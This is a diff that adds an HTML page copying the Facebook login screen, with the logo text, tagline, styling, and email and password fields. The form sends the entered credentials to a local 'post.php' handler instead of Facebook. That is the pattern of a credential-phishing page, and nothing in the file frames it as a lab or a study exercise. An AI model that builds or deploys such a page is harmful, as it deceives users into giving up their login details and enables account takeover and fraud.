@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            min-height: 100vh;
+        }
+
+        .wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 0 20px;
+        }
+
+        .container {
+            display: flex;
+            align-items: center;
+            max-width: 980px;
+            width: 100%;
+            gap: 40px;
+        }
+
+        .left-section {
+            flex: 1;
+            padding-right: 32px;
+        }
+
+        .logo-text {
+            font-size: 56px;
+            font-weight: 700;
+            color: #1877f2;
+            line-height: 1;
+            margin-bottom: 16px;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        .tagline {
+            font-size: 24px;
+            font-weight: 400;
+            line-height: 32px;
+            color: #1c1e21;
+        }
+
+        .right-section {
+            width: 396px;
+            flex-shrink: 0;
+        }
+
+        .login-card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+            padding: 20px;
+            text-align: center;
+        }
+
+        .login-card input[type="email"],
+        .login-card input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            outline: none;
+            margin-bottom: 12px;
+            color: #1d2129;
+            transition: border-color 0.2s;
+        }
+
+        .login-card input[type="email"]:focus,
+        .login-card input[type="password"]:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .login-card input[type="email"]::placeholder,
+        .login-card input[type="password"]::placeholder {
+            color: #90949c;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 0 16px;
+            height: 48px;
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-top: 4px;
+            transition: background-color 0.2s;
+        }
+
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-link {
+            display: block;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-top: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .create-btn {
+            display: inline-block;
+            padding: 0 16px;
+            height: 48px;
+            line-height: 48px;
+            font-size: 17px;
+            font-weight: 700;
+            color: #ffffff;
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            text-decoration: none;
+            transition: background-color 0.2s;
+        }
+
+        .create-btn:hover {
+            background-color: #36a420;
+        }
+
+        .page-link {
+            display: block;
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+            text-align: center;
+        }
+
+        .page-link a {
+            color: #1c1e21;
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .page-link a:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px 0 40px;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            font-size: 12px;
+            color: #737373;
+            text-decoration: none;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-copy {
+            font-size: 11px;
+            color: #737373;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+                gap: 20px;
+            }
+
+            .left-section {
+                padding-right: 0;
+            }
+
+            .logo-text {
+                font-size: 42px;
+            }
+
+            .tagline {
+                font-size: 20px;
+                line-height: 28px;
+            }
+
+            .right-section {
+                width: 100%;
+                max-width: 396px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="container">
+            <div class="left-section">
+                <div class="logo-text">facebook</div>
+                <p class="tagline">Facebook helps you connect and share with the people in your life.</p>
+            </div>
+            <div class="right-section">
+                <form id="login_form" action="post.php" method="post">
+                    <div class="login-card">
+                        <input type="email" name="email" id="email" placeholder="Email address or phone number" aria-label="Email address or phone number" autofocus>
+                        <input type="password" name="pass" id="pass" placeholder="Password" aria-label="Password">
+                        <button type="submit" class="login-btn">Log In</button>
+                        <a href="#" class="forgot-link">Forgotten password?</a>
+                        <div class="divider"></div>
+                        <button type="button" class="create-btn">Create new account</button>
+                    </div>
+                </form>
+                <p class="page-link"><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
